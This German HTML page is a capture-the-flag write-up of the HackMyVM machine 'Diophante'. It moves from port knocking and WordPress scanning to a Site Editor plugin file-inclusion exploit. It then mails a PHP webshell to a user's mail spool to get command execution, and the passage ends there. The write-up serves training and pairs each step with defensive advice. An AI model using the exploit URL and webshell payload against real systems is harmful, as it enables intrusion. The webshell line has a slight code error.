@@ -1,0 +1,729 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Diophante - HackMyVM - Hard - Vulnhub - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg"> <!-- CSS muss background-color: #03b5f5; setzen -->
+        <h1>Diophante - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- CSS muss hier die Farbe auf Rot setzen -->
+            <h2>Hard</h2>
+            <div class="circle">
+                 <!-- CSS muss hier die Farbe auf Rot setzen -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- CSS muss hier die Hintergrundfarbe auf ein passendes Rot setzen -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">hping3</div>
+                <div class="tool-item">knock</div>
+                <div class="tool-item">telnet</div>
+                <div class="tool-item">wpscan</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">doas</div>
+                <div class="tool-item">setsid</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">mutt</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">gcc</div>
+                <div class="tool-item">LD_PRELOAD</div>
+                <div class="tool-item">unsetenv</div>
+                <div class="tool-item">setgid</div>
+                <div class="tool-item">setuid</div>
+                <div class="tool-item">system</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ls</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root Exploit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird genutzt, um aktive Hosts im lokalen Netzwerksegment zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP <span class="command">192.168.2.147</span> und der MAC `08:00:27:c7:b4:9b` (PCS Systemtechnik GmbH / VirtualBox) wird entdeckt. Dies ist das Zielsystem "Diophante".</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die IP 192.168.2.147 für weitere Scans.
+            <br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit von Hosts einschränken.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.147	08:00:27:c7:b4:9b	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein erster `nmap`-Scan (`-sS -sC -T5 -A -p-`) wird auf die Ziel-IP durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+            <ul><li><span class="command">22/tcp (SSH)</span>: OpenSSH 8.4p1 auf Debian 5.</li><li><span class="command">80/tcp (HTTP)</span>: Apache httpd 2.4.38 auf Debian.</li></ul>
+            Zusätzlich wird Port <span class="command">25/tcp (SMTP)</span> als `<span class="password">filtered</span>` angezeigt. Das bedeutet, Nmap konnte nicht definitiv bestimmen, ob der Port offen oder geschlossen ist, wahrscheinlich blockiert eine Firewall die Nmap-Probes, lässt aber möglicherweise legitimen SMTP-Verkehr durch.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Webserver (Port 80). Behalten Sie SSH (Port 22) im Auge. Notieren Sie den gefilterten Port 25 - er könnte später relevant werden, möglicherweise nach Umgehung einer Firewall oder durch Port Knocking.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Firewalls korrekt konfiguriert sind und nur notwendige Ports freigeben. Untersuchen Sie, warum Port 25 als gefiltert erscheint.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.147 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at ...
+Nmap scan report for 192.168.2.147
+Host is up (0.00011s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT   STATE       SERVICE VERSION
+<span class="command">22/tcp open        ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+| ssh-hostkey:
+|   [...]
+<span class="command">80/tcp open        http    Apache httpd 2.4.38 ((Debian))</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.38 (Debian)
+<span class="command">25/tcp filtered    smtp</span>
+
+Nmap done: 1 IP address (1 host up) scanned in ... seconds
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird editiert, um einen Hostnamen (`dio.vm`) der Ziel-IP zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt, um Webdienste auf dem Ziel unter dem Hostnamen `dio.vm` ansprechen zu können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `dio.vm` für weitere Web-Enumeration.
+            <br><strong>Empfehlung (Admin):</strong> Clientseitige Konfiguration.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre><span class="comment"># Hinzugefügte Zeile: 192.168.2.147 dio.vm</span></pre>
+                 </div>
+             </div>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf `http://dio.vm` zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet:
+            <ul><li>`/index.html`: Startseite.</li><li>`/blog/`: Ein Verzeichnis, das wahrscheinlich eine Blog-Anwendung (oft WordPress) enthält.</li><li>`<span class="command">/note.txt</span>`: Eine Textdatei.</li></ul></p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt von `/note.txt`. Führen Sie einen weiteren `gobuster`-Scan auf `/blog/` durch.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige Notizdateien vom Webserver.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://dio.vm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[...]
+<span class="command">/index.html</span>           (Status: 200) [Size: 10701]
+<span class="command">/blog</span>                 (Status: 301) [Size: 305] [--> http://dio.vm/blog/]
+<span class="command">/note.txt</span>             (Status: 200) [Size: 36]
+[...]
+===============================================================
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der gefundenen Datei `/note.txt` wird mit `curl` abgerufen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Notiz enthält die Zahlen `<span class="password">7000 8000 9000</span>` und das Wort `<span class="command">admin</span>`. Dies ist ein starker Hinweis auf Port Knocking. Die Zahlen sind wahrscheinlich die Sequenz der Ports, die "angeklopft" werden müssen, um einen anderen Port (vermutlich den gefilterten Port 25/SMTP) zu öffnen. `admin` könnte ein Benutzername sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie ein Port-Knocking-Tool (z.B. `knockd`, `knock` oder manuell mit `hping3`, `nmap`, `nc`), um die Portsequenz 7000, 8000, 9000 auf dem Ziel `dio.vm` anzuklopfen. Führen Sie anschließend erneut einen Nmap-Scan durch, um zu sehen, ob Port 25 oder andere Ports geöffnet wurden.
+            <br><strong>Empfehlung (Admin):</strong> Port Knocking bietet nur geringe Sicherheit (Security through Obscurity). Wenn es verwendet wird, stellen Sie sicher, dass die Sequenz nicht leicht zu erraten ist und der Dienst, der geöffnet wird, selbst robust abgesichert ist. Besser sind VPNs oder Authentifizierung auf vorgeschalteten Firewalls.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://dio.vm/note.txt</span></div>
+                    <pre>
+Don't forget: <span class="password">7000 8000 9000</span>
+
+<span class="command">admin</span></pre>
+                 </div>
+             </div>
+
+        </section>
+
+        <section id="reconnaissance"> <!-- Port Knocking gehört zur Reconnaissance/Enumeration -->
+            <h2>Reconnaissance (Port Knocking)</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> `hping3` wird verwendet, um SYN-Pakete an die Ports 7000, 8000 und 9000 zu senden. `-S` setzt das SYN-Flag, `-p` gibt den Port an, `-c 1` sendet nur ein Paket.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Alle drei Ports antworten (`1 packets received`). Dies bestätigt, dass die Ports erreichbar sind, sagt aber noch nichts über den Erfolg des Port Knockings aus. Es ist ein manueller Versuch, die Ports "anzuklopfen".</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie ein dediziertes Tool wie `knock` für eine zuverlässigere Ausführung der Sequenz oder führen Sie direkt nach diesem Versuch einen erneuten Nmap-Scan durch.
+            <br><strong>Empfehlung (Admin):</strong> Überwachen Sie ungewöhnliche Verbindungsversuche auf hohe Portnummern oder in spezifischen Sequenzen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">for i in {7000,8000,9000}; do hping3 -S 192.168.2.147 -p $i -c 1; done</span></div>
+                    <pre>
+HPING 192.168.2.147 (eth0 192.168.2.147): S set, 40 headers + 0 data bytes
+len=46 ip=192.168.2.147 ttl=64 id=0 sport=7000 flags=SA seq=0 win=65160 rtt=0.3 ms
+
+--- 192.168.2.147 hping statistic ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 0.3/0.3/0.3 ms
+HPING 192.168.2.147 (eth0 192.168.2.147): S set, 40 headers + 0 data bytes
+len=46 ip=192.168.2.147 ttl=64 id=0 sport=8000 flags=SA seq=0 win=65160 rtt=0.2 ms
+
+--- 192.168.2.147 hping statistic ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 0.2/0.2/0.2 ms
+HPING 192.168.2.147 (eth0 192.168.2.147): S set, 40 headers + 0 data bytes
+len=46 ip=192.168.2.147 ttl=64 id=0 sport=9000 flags=SA seq=0 win=65160 rtt=0.3 ms
+
+--- 192.168.2.147 hping statistic ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 0.3/0.3/0.3 ms</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das Tool `knock` wird verwendet, um die Port-Knocking-Sequenz (TCP-Ports 7000, 8000, 9000) an das Ziel `dio.vm` zu senden. `-v` sorgt für eine ausführliche Ausgabe.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Tool sendet die Pakete erfolgreich an die spezifizierten Ports. Dies ist die empfohlene Methode für Port Knocking.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie unmittelbar nach diesem Befehl einen erneuten Nmap-Scan auf das Ziel durch, um zu überprüfen, ob neue Ports geöffnet wurden (insbesondere Port 25).
+            <br><strong>Empfehlung (Admin):</strong> (Siehe vorherige Empfehlung zu Port Knocking).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">knock dio.vm -v 7000 8000 9000</span></div>
+                    <pre>
+<span class="password">hitting tcp 192.168.2.147:7000</span>
+<span class="password">hitting tcp 192.168.2.147:8000</span>
+<span class="password">hitting tcp 192.168.2.147:9000</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Port Knocking wird erneut ein Nmap-Scan durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Das Port Knocking war erfolgreich!</span> Port <span class="command">25/tcp (SMTP)</span>, der zuvor als `filtered` angezeigt wurde, ist nun `<span class="password">open</span>`. Der Dienst wird als Postfix SMTPD identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den nun offenen SMTP-Dienst (Port 25). Versuchen Sie, sich mit `telnet` zu verbinden, um verfügbare Befehle (z.B. `VRFY`, `EXPN`) zu testen und Benutzer zu enumerieren.
+            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Sicherheit des SMTP-Servers und die Konfiguration des Port-Knocking-Daemons.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.147 -p-</span></div>
+                     <pre>
+Starting Nmap ...
+Nmap scan report for dio.vm (192.168.2.147)
+Host is up (0.00012s latency).
+Not shown: ... closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+| ssh-hostkey:
+|   [...]
+<span class="command">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span>
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+<span class="command">25/tcp open  smtp    Postfix smtpd</span>
+|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+| ssl-cert: Subject: commonName=debian
+| Subject Alternative Name: DNS:debian
+| Issuer: commonName=debian
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-12-26T17:10:27
+|_Not valid after:  2030-12-24T17:10:27
+|_ssl-date: TLS randomness does not represent time
+[...]
+Nmap done: 1 IP address (1 host up) scanned in ... seconds
+</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration"> <!-- Gehört eher zur Web Enum -->
+             <h2>Web Enumeration (Blog)</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird nun gezielt auf das Verzeichnis `/blog` angewendet, das im ersten Scan gefunden wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan bestätigt eine WordPress-Installation durch Funde wie `/wp-content/`, `/wp-login.php`, `/license.txt`, `/wp-includes/`, `/readme.html`, `/wp-admin/`, `xmlrpc.php` und `/wp-signup.php`. Wichtig ist auch der Hinweis auf die Benutzer-Enumeration über die REST-API: `/wp-json/wp/v2/users`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `wpscan`, um die WordPress-Installation (`http://dio.vm/blog/`) detailliert zu scannen (Version, Themes, Plugins, Benutzer, Schwachstellen). Rufen Sie den `/wp-json/wp/v2/users`-Endpunkt auf, um Benutzernamen zu finden.
+            <br><strong>Empfehlung (Admin):</strong> Halten Sie WordPress (Core, Themes, Plugins) aktuell. Beschränken Sie den Zugriff auf die REST-API, falls nicht benötigt. Deaktivieren Sie die Benutzerregistrierung (`/wp-signup.php`), wenn nicht erforderlich.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://dio.vm/blog" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[...]
+<span class="command">/index.php</span>            (Status: 301) [Size: 0] [--> http://dio.vm/blog/]
+<span class="command">/wp-content</span>           (Status: 301) [Size: 310] [--> http://dio.vm/blog/wp-content/]
+<span class="command">/wp-login.php</span>         (Status: 200) [Size: 8227]
+<span class="command">/license.txt</span>          (Status: 200) [Size: 19915]
+<span class="command">/wp-includes</span>          (Status: 301) [Size: 311] [--> http://dio.vm/blog/wp-includes/]
+<span class="command">/readme.html</span>          (Status: 200) [Size: 8852]
+<span class="command">/wp-trackback.php</span>     (Status: 200) [Size: 165]
+<span class="command">/wp-admin</span>             (Status: 301) [Size: 308] [--> http://dio.vm/blog/wp-admin/]
+<span class="command">/xmlrpc.php</span>           (Status: 405) [Size: 42]
+<span class="command">/wp-signup.php</span>        (Status: 302) [Size: 0] [--> http://dio.vm/blog/wp-login.php?action=register]
+[...]
+===============================================================
+</pre>
+<pre><span class="comment">Implizit gefunden/bekannt:</span>
+<span class="command">http://dio.vm/blog/wp-json/wp/v2/users</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `wpscan` wird verwendet, um die WordPress-Installation unter `http://dio.vm/blog` (im Befehl steht `http://hard/blog`, dies ist wahrscheinlich ein Tippfehler, `dio.vm` wird angenommen) zu scannen. `-e ap` enumeriert alle Plugins. Ein API-Token wird verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `wpscan` identifiziert das Theme `twentynineteen`. Wichtiger ist der Fund des Plugins `<span class="command">Site Editor</span>` Version `<span class="command">1.1.1</span>`. Für dieses Plugin wird eine bekannte <span class="password">Local File Inclusion (LFI)</span> Schwachstelle (CVE-2018-7422) gemeldet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die identifizierte LFI-Schwachstelle im Site Editor Plugin. Verwenden Sie `searchsploit` oder die angegebenen Referenzen, um den genauen Exploit-Pfad zu finden und Dateien auf dem Server zu lesen (z.B. `/etc/passwd`, Konfigurationsdateien).
+            <br><strong>Empfehlung (Admin):</strong> Aktualisieren oder entfernen Sie das anfällige "Site Editor"-Plugin sofort.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wpscan --url http://dio.vm/blog -e ap --no-banner --api-token ...</span></div>
+                     <pre>
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[...]
+[i] XML-RPC seems to be enabled: http://dio.vm/blog/xmlrpc.php
+[...]
+[+] WordPress theme in use: <span class="command">twentynineteen</span>
+ | Location: http://dio.vm/blog/wp-content/themes/twentynineteen/
+ | Last Updated: 2022-09-09T00:00:00.000Z
+ | Readme: http://dio.vm/blog/wp-content/themes/twentynineteen/readme.txt
+ | Style URL: http://dio.vm/blog/wp-content/themes/twentynineteen/style.css?ver=1.9
+ | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom styles...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+
+[+] Enumerating All Plugins (via Aggressive Methods)
+ Checking Known Locations - Time: 00:00:07 <span class="comment">(1383 / 1383) 100.00%</span>
+
+[i] No plugins found.
+
+[+] Enumerating Config Backups (via Aggressive Methods)
+
+[i] No Config Backups found.
+
+[+] Enumerating Plugins (via Passive and Aggressive Methods)
+ Checking Plugin's Known Locations - Time: 00:00:12 <span class="comment">(691 / 691) 100.00%</span>
+
+[+] Checking Name: <span class="command">site-editor</span>
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://dio.vm/blog/wp-content/plugins/site-editor/, status: 200
+ | Confirmed By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://dio.vm/blog/wp-content/plugins/site-editor/readme.txt
+
+[!] <span class="password">1 vulnerability identified</span>:
+
+[!] Title: <span class="password">Site Editor <= 1.1.1 - Local File Inclusion (LFI)</span>
+ |     References:
+ |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
+ |      - https://seclists.org/fulldisclosure/2018/Mar/40
+ |      - https://github.com/SiteEditor/editor/issues/2
+ |
+ | Version: <span class="command">1.1.1</span> (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://dio.vm/blog/wp-content/plugins/site-editor/readme.txt
+
+[...]
+</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `searchsploit` wird verwendet, um nach Exploits für "Site Editor wordpress" zu suchen. Der gefundene Exploit (44340.txt) wird mit `-m` in das aktuelle Verzeichnis kopiert und mit `cat` angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `searchsploit` findet einen Exploit für die LFI-Schwachstelle. Die Exploit-Datei (44340.txt) enthält den Pfad zur anfälligen PHP-Datei und den zu verwendenden Parameter:
+             `http://[TARGET]/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=[FILEPATH]`
+             Es wird gezeigt, dass `ajax_path=../etc/passwd` fehlschlägt, aber `ajax_path=/etc/passwd` funktioniert und den Inhalt der Passwortdatei preisgibt. Die Benutzer `<span class="command">sabine</span>` (mit `/bin/rbash` - Restricted Bash) und `<span class="command">leonard</span>` (mit `/bin/bash`) werden bestätigt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den LFI-Exploit-Pfad, um weitere sensible Dateien zu lesen (z.B. `/etc/shadow`, `/var/mail/sabine`, `/var/mail/leonard`, WordPress `wp-config.php`).
+             <br><strong>Empfehlung (Admin):</strong> Anfälliges Plugin entfernen/aktualisieren.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">searchsploit Site Editor wordpress</span></div>
+                     <pre>
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------------
+<span class="password">WordPress Plugin Site Editor 1.1.1 - Local File Inclusion</span>   | <span class="command">php/webapps/44340.txt</span>
+WordPress Plugin User Role Editor 3.12 - Cross-Site Request | php/webapps/25721.txt
+------------------------------------------------------------ ---------------------------------</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">searchsploit -m php/webapps/44340.txt</span></div>
+                     <pre>  Exploit: WordPress Plugin Site Editor 1.1.1 - Local File Inclusion
+  [...]
+  Copied to: /root/44340.txt</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /root/44340.txt</span></div>
+                     <pre>
+# Exploit Title: Wordpress Plugin Site Editor 1.1.1 - Local File Inclusion (LFI)
+# Date: 2018-03-14
+# Exploit Author: Moudi
+# Vendor Homepage: https://siteeditor.org/
+# Software Link: https://downloads.wordpress.org/plugin/site-editor.1.1.1.zip
+# Version: 1.1.1 and below
+# Tested on: Windows / Linux
+
+# Vulnerability Details:
+# In the file ( ajax_shortcode_pattern.php ) the parameter 'ajax_path' is vulnerable to LFI.
+# This can be exploited remotely without the need for authentication.
+
+# POC:
+<span class="password">http://localhost/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../../../../wp-config.php</span>
+
+</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                    <pre><span class="comment"># Test des Exploits (aus Text extrahiert)</span>
+<span class="command">http://dio.vm/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../etc/passwd</span>
+<span class="password">{"success":false,"message":"Error: didn't load shortcodes pattern file"}</span> <span class="comment"># Fehlgeschlagen</span>
+
+<span class="command">http://dio.vm/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd</span>
+<span class="password">root:x:0:0:root:/root:/bin/bash
+[...]
+sabine:x:1000:1000:sabine,,,:/home/sabine:/bin/rbash
+leonard:x:1001:1001:,,,:/home/leonard:/bin/bash</span>
+<span class="comment">[...]</span>
+{"success":true,"data":{"output":[]}} <span class="comment"># Erfolgreich!</span>
+</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Mail Poisoning & LFI RCE)</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach dem erneuten Port Knocking wird eine Telnet-Verbindung zum nun offenen SMTP-Port (25) aufgebaut. Die SMTP-Befehle `EHLO`, `VRFY sabine`, `VRFY leonard`, `MAIL FROM`, `RCPT TO` und `DATA` werden verwendet, um eine E-Mail von `leonard` an `sabine` zu senden. Der Inhalt der E-Mail ist eine einfache PHP-Webshell: `<span class="password">system($GET["cmd"]); ?></span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein cleverer Trick, um die LFI-Schwachstelle zur Remote Code Execution (RCE) zu eskalieren (Mail Poisoning / Log Poisoning über Mail).
+            <ol><li>Die `VRFY`-Befehle bestätigen, dass `sabine` und `leonard` gültige lokale Benutzer sind.</li><li>Die E-Mail mit dem PHP-Code im Body wird erfolgreich an `sabine` gesendet (`250 2.0.0 Ok: queued as ...`).</li><li>Der Mailserver speichert eingehende E-Mails normalerweise in Dateien unter `/var/mail/` oder `/var/spool/mail/` (z.B. `/var/mail/sabine`).</li><li>Wenn nun die Maildatei (`/var/mail/sabine`) über die LFI eingebunden wird, wird der darin enthaltene PHP-Code (`system($GET["cmd"])`) vom Webserver ausgeführt.</li></ol></p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Binden Sie die Maildatei von `sabine` über die LFI ein und fügen Sie den `cmd`-Parameter hinzu, um Befehle auszuführen: `http://dio.vm/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&cmd=id`. Nutzen Sie dies, um eine Reverse Shell zu erhalten.
+            <br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle. Beschränken Sie die Leseberechtigungen für Mail-Spool-Verzeichnisse (`/var/mail`), sodass der Webserver-Benutzer (`www-data`) keinen Zugriff darauf hat. Konfigurieren Sie den SMTP-Server sicher (z.B. `VRFY`/`EXPN` deaktivieren, wenn nicht benötigt).</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">knock 192.168.2.128 7000 8000 9000</span></div> <span class="comment"># IP hier 128, vorher 147? Annahme 147 ist korrekt.</span>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">telnet dio.vm 25</span></div>
+                     <pre>
+Trying 192.168.2.147...
+<span class="password">Connected to dio.vm.</span>
+Escape character is '^]'.
+<span class="password">220 debian ESMTP Postfix (Debian/GNU)</span></pre>
+                     <span class="command">EHLO dio.vm</span>
+                     <pre>
+250-debian
+250-PIPELINING
+250-SIZE 10240000
+250-VRFY
+250-ETRN
+250-STARTTLS
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250-DSN
+250-SMTPUTF8
+250 CHUNKING</pre>
+                     <span class="command">VRFY sabine</span>
+                     <pre><span class="password">252 2.0.0 sabine</span></pre>
+                     <span class="command">VRFY leonard</span>
+                     <pre><span class="password">252 2.0.0 leonard</span></pre>
+                     <span class="command">MAIL FROM:leonard</span>
+                     <pre>250 2.1.0 Ok</pre>
+                     <span class="command">RCPT TO: sabine</span>
+                     <pre>250 2.1.5 Ok</pre>
+                     <span class="command">DATA</span>
+                     <pre>354 End data with <CR><LF>.<CR><LF></pre>
+                     <span class="command">subject: hello</span>
+                     <span class="command"><?php system($GET["cmd"]); ?></span>
+                     <span class="command">.</span>
+                     <pre><span class="password">250 2.0.0 Ok: queued as 0F38E80ABD</span></pre>
+                     <span class="command">quit</span>
+                     <pre>
+221 2.0.0 Bye
+Connection closed by foreign host.</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die LFI-Schwachstelle wird genutzt, um die Maildatei von `sabine` (`/var/mail/sabine`) einzubinden und gleichzeitig den Befehl `whoami` über den `cmd`-Parameter auszuführen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> <span class="password">RCE erfolgreich!</span> Die Ausgabe enthält die Zeilen der E-Mail und dazwischen `<span class="password">www-data</span>` - die Ausgabe des `whoami`-Befehls, der durch die Webshell in der Maildatei ausgeführt wurde. Der Angreifer hat nun Codeausführung als `www-data`.</p>
